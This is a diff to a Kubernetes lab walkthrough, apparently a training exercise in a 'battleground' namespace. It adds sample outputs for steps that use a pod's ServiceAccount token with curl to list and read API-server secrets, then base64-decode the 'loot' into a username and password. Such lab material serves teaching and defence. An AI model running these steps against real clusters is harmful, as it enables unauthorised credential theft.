@@ -57,7 +57,23 @@ curl -s --cacert "$CACERT" \
   "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets"
 ```
 
-**Expected Result:** You should see a JSON list of secrets, including `super-secret-db-creds` and the ServiceAccount token itself.
+**Output:**
+
+```json
+{
+  "kind": "SecretList",
+  "apiVersion": "v1",
+  "items": [
+    {
+      "metadata": {
+        "name": "super-secret-db-creds",
+        "namespace": "battleground"
+      },
+      "type": "Opaque"
+    }
+  ]
+}
+```
 
 ### 3.3. Read the Target Secret
 
@@ -69,7 +85,23 @@ curl -s --cacert "$CACERT" \
   "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/super-secret-db-creds"
 ```
 
-You will get a JSON response with `data` fields encoded in Base64.
+**Output:**
+
+```json
+{
+  "kind": "Secret",
+  "apiVersion": "v1",
+  "metadata": {
+    "name": "super-secret-db-creds",
+    "namespace": "battleground"
+  },
+  "data": {
+    "password": "VGhpc0lzVGhlUGFzc3dvcmQxMjMh",
+    "username": "YWRtaW4="
+  },
+  "type": "Opaque"
+}
+```
 
 ### 3.4. Decode the Loot
 
@@ -78,8 +110,13 @@ Kubernetes secrets are base64 encoded, not encrypted (at the API level).
 If you have `base64` installed in the pod (our nginx image might not, but let's check):
 
 ```sh
-# If base64 tool exists
-echo "BASE64_VALUE_HERE" | base64 -d
+# Decode Username
+echo "YWRtaW4=" | base64 -d
+# Output: admin
+
+# Decode Password
+echo "VGhpc0lzVGhlUGFzc3dvcmQxMjMh" | base64 -d
+# Output: ThisIsThePassword123!
 ```
 
 If `base64` is missing, you can use `openssl` (if available) or just copy the string to your local machine to decode.
